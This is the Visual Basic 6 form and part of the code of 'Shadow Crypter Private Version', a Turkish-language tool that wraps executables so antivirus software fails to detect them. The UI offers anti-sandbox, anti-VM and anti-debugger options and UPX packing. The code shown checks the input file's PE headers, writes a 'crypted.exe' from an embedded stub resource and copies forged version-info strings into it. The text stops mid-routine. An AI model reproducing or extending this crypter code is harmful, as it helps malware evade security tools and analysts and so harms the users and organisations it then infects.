VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Frm1 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   9045
   ClientLeft      =   15
   ClientTop       =   15
   ClientWidth     =   8070
   ControlBox      =   0   'False
   ForeColor       =   &H00000000&
   Icon            =   "frm1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9045
   ScaleWidth      =   8070
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti CWSandbox"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   9
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   34
      Top             =   6720
      Width           =   1695
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti OllyDbg"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   8
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   33
      Top             =   6480
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti Procmon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   7
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   32
      Top             =   6240
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti Filemon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   6
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   31
      Top             =   6000
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti Regmon"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   5
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   30
      Top             =   5760
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti Anubis"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   4
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   29
      Top             =   5520
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti Sanboxie"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   3
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   28
      Top             =   5280
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti VMWare"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   2
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   27
      Top             =   5040
      Width           =   1335
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Anti Norman"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   195
      Index           =   1
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   26
      Top             =   4800
      Width           =   1335
   End
   Begin MSComctlLib.ProgressBar bar 
      Height          =   2175
      Left            =   6960
      TabIndex        =   24
      Top             =   4800
      Width           =   135
      _ExtentX        =   238
      _ExtentY        =   3836
      _Version        =   393216
      BorderStyle     =   1
      Appearance      =   0
      Orientation     =   1
      Scrolling       =   1
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   0
      Left            =   7320
      TabIndex        =   14
      Top             =   1920
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":17002
      PICN            =   "frm1.frx":1731C
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.ComboBox Combo1 
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      ItemData        =   "frm1.frx":1766E
      Left            =   6480
      List            =   "frm1.frx":1768D
      MousePointer    =   99  'Custom
      Style           =   2  'Dropdown List
      TabIndex        =   10
      Top             =   4020
      Width           =   615
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "UPX ile Sýkýþtýr"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   345
      Index           =   0
      Left            =   4920
      MaskColor       =   &H00FFFFFF&
      MousePointer    =   99  'Custom
      TabIndex        =   9
      Top             =   4020
      Width           =   1575
   End
   Begin MSComctlLib.ListView lvw 
      Height          =   4095
      Left            =   240
      TabIndex        =   4
      Top             =   2880
      Width           =   4335
      _ExtentX        =   7646
      _ExtentY        =   7223
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      SmallIcons      =   "resimlist"
      ForeColor       =   -2147483640
      BackColor       =   16777215
      BorderStyle     =   1
      Appearance      =   0
      MousePointer    =   99
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   2
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Bilgi"
         Object.Width           =   2822
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Deðer"
         Object.Width           =   4057
      EndProperty
   End
   Begin VB.TextBox txtlog 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Trebuchet MS"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1335
      Left            =   240
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Top             =   7440
      Width           =   7575
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   945
      TabIndex        =   0
      Top             =   2100
      Width           =   6135
   End
   Begin VB.PictureBox Picture1 
      Height          =   0
      Left            =   0
      ScaleHeight     =   0
      ScaleWidth      =   0
      TabIndex        =   11
      Top             =   0
      Width           =   0
   End
   Begin VB.PictureBox banner 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   1695
      Index           =   1
      Left            =   0
      Picture         =   "frm1.frx":176AC
      ScaleHeight     =   1695
      ScaleWidth      =   8100
      TabIndex        =   12
      Top             =   0
      Width           =   8100
      Begin VB.FileListBox File1 
         Height          =   870
         Left            =   5160
         TabIndex        =   35
         Top             =   1680
         Visible         =   0   'False
         Width           =   855
      End
      Begin VB.ComboBox dilop 
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   315
         Left            =   0
         MousePointer    =   99  'Custom
         Style           =   2  'Dropdown List
         TabIndex        =   23
         Top             =   0
         Width           =   975
      End
      Begin VB.ComboBox dil 
         Height          =   315
         Left            =   5160
         Style           =   2  'Dropdown List
         TabIndex        =   22
         Top             =   1560
         Visible         =   0   'False
         Width           =   2895
      End
      Begin MSComctlLib.ImageList resimlist 
         Left            =   1560
         Top             =   1080
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   19
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":19E18
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1A0AF
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1A2FD
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1A570
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1A982
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1AC00
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1AE7E
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1B0B7
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1B22B
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1B32D
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1B5AE
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1B822
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1BC2E
               Key             =   ""
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1BECD
               Key             =   ""
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1C147
               Key             =   ""
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1C3A0
               Key             =   ""
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1C7C7
               Key             =   ""
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1CA44
               Key             =   ""
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm1.frx":1CC7C
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin Crypter.cmd btn 
         Height          =   300
         Index           =   7
         Left            =   7800
         TabIndex        =   21
         Top             =   0
         Width           =   255
         _ExtentX        =   450
         _ExtentY        =   529
         BTYPE           =   8
         TX              =   "X"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   0
         BCOLO           =   0
         FCOL            =   16777215
         FCOLO           =   128
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "frm1.frx":1D083
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   2
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00000080&
         Index           =   1
         X1              =   0
         X2              =   8160
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00000080&
         Index           =   0
         X1              =   -135
         X2              =   8025
         Y1              =   330
         Y2              =   330
      End
      Begin VB.Label baslik 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Shadow Crypter Private Version"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   300
         Left            =   0
         TabIndex        =   13
         Top             =   0
         Width           =   8055
      End
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   1
      Left            =   7320
      TabIndex        =   15
      Top             =   2640
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":1D39D
      PICN            =   "frm1.frx":1D6B7
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   2
      Left            =   7320
      TabIndex        =   16
      Top             =   3360
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":1DA09
      PICN            =   "frm1.frx":1DD23
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   3
      Left            =   7320
      TabIndex        =   17
      Top             =   4080
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":1E075
      PICN            =   "frm1.frx":1E38F
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   4
      Left            =   7320
      TabIndex        =   18
      Top             =   4800
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":1E6E1
      PICN            =   "frm1.frx":1E9FB
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   5
      Left            =   5760
      TabIndex        =   19
      Top             =   2880
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":1ED4D
      PICN            =   "frm1.frx":1F067
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Crypter.cmd btn 
      Height          =   615
      Index           =   6
      Left            =   6480
      TabIndex        =   20
      Top             =   2880
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1085
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":1F3B9
      PICN            =   "frm1.frx":1F6D3
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   2
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   2445
      Index           =   6
      Left            =   6840
      Top             =   4680
      Width           =   375
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   " Anti Debugger "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   6
      Left            =   4920
      TabIndex        =   25
      Top             =   4560
      Width           =   1125
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   2445
      Index           =   5
      Left            =   4800
      Top             =   4680
      Width           =   1935
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   " Sýkýþtýrma Ayarlarý  "
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   5
      Left            =   4920
      TabIndex        =   8
      Top             =   3720
      Width           =   1395
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   645
      Index           =   4
      Left            =   4800
      Top             =   3840
      Width           =   2415
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   " Simge Ayarlarý "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   3
      Left            =   4920
      TabIndex        =   7
      Top             =   2640
      Width           =   1110
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   885
      Index           =   2
      Left            =   4800
      Top             =   2760
      Width           =   2415
   End
   Begin VB.Image simge 
      Appearance      =   0  'Flat
      BorderStyle     =   1  'Fixed Single
      Height          =   615
      Left            =   4920
      Stretch         =   -1  'True
      Top             =   2880
      Width           =   735
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   " Loglar "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   4
      Left            =   240
      TabIndex        =   6
      Top             =   7200
      Width           =   525
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   1605
      Index           =   3
      Left            =   120
      Top             =   7320
      Width           =   7815
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   " Sürüm Bilgisi "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   2
      Left            =   240
      TabIndex        =   5
      Top             =   2640
      Width           =   960
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   4365
      Index           =   1
      Left            =   120
      Top             =   2760
      Width           =   4575
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Dosya : "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000080&
      Height          =   195
      Index           =   1
      Left            =   285
      TabIndex        =   3
      Top             =   2145
      Width           =   600
   End
   Begin VB.Label lbl 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   " Tanýnmaz Yapýlacak Dosya "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   0
      Left            =   240
      TabIndex        =   2
      Top             =   1800
      Width           =   1965
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00000080&
      Height          =   645
      Index           =   0
      Left            =   120
      Top             =   1920
      Width           =   7095
   End
End
Attribute VB_Name = "Frm1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Const sifre = "000"
Dim dosya As String
Dim sayac As Integer
Dim i As Integer
Dim dosyano As Integer
Dim tampon() As Byte
Dim numara As Integer
Dim gecici As String
Dim anahtar As String * 30
Dim fileinf As String * 30
Dim karakter As String * 1
Dim dizi(30) As String
Dim yazilacak As String

Private Sub banner_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    tasi Me
End Sub

Private Sub baslik_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    tasi Me
End Sub

 
Private Sub btn_Click(Index As Integer)
    Select Case Index
        Case 0
            hk 2
           If VBGetOpenFileName(dosya, , True, , , , "PE Files(*.EXE)|*.*", 1, , , "txt", Me.hWnd) Then
                lvw.ListItems.Clear
        hk 3
        dosyano = FreeFile
        Open dosya For Binary As #dosyano
            ReDim tampon(LOF(dosyano) - 1)
            Get #dosyano, , tampon
        Close #dosyano
        hk 10
        Call CopyMemory(IDH, tampon(0), Len(IDH))
        If IDH.e_magic <> IMAGE_DOS_SIGNATURE Then
            hk 12
            Exit Sub
        End If
        hk 11
        hk 13
        Call CopyMemory(INH, tampon(IDH.e_lfanew), Len(INH))
        If INH.Signature <> IMAGE_NT_SIGNATURE Then
            hk 15
            Exit Sub
        End If
        hk 14
        hk 3
        txt.Text = dosya
    
                
                
                hk 6
                txtlog.Text = txtlog.Text & dil.List(0) & "EOF DATA : " & Len(ReadEOFData(dosya)) & " BYTES" & vbCrLf
                versionbilgisial
                

                hk 7
            Else
                hk 4
           End If
           
           
        Case 1
            bar.Value = 0
        
            hk 16
            
            dosya = "crypted.exe"
            If (VBGetSaveFileName(dosya, , , "PE Files (*.EXE)", , , , "", Me.hWnd)) Then
                If Right(dosya, 4) <> ".exe" Then dosya = dosya & ".exe"
                 bar.Value = 10
                              
                If Dir(txt.Text) = vbNullString Then Exit Sub
                
                numara = FreeFile
                        Open txt.Text For Binary As #numara
                            gecici = Space(LOF(numara))
                            Get #numara, , gecici
                        Close #numara
                        bar.Value = 40
                        If Dir(dosya) <> vbNullString Then Kill dosya ' eðer dosya yoksa dosyayi sil
                        bar.Value = 70
                        numara = FreeFile
                        tampon = LoadResData(101, "CUSTOM")
                        bar.Value = 20
                        Open dosya For Binary As #numara
                            Put #numara, , tampon


                            '0 - > 21061 - comments - 15
                            fileinf = String(30, " ")
                            fileinf = lvw.ListItems(15).SubItems(1)
                            
                            For sayac = 1 To 30
                                karakter = Mid(fileinf, sayac, 1)
                                dizi(sayac) = karakter
                            Next
                            
                            i = 1
                            For sayac = 1 To 30
                             Put #numara, 21060 + i, dizi(sayac)
                             i = i + 2
                            Next
                            
                            '1 - > 21157 - company - 3
                            fileinf = String(30, " ")
                            fileinf = lvw.ListItems(3).SubItems(1)
                            
                            For sayac = 1 To 30
                                karakter = Mid(fileinf, sayac, 1)
                                dizi(sayac) = karakter
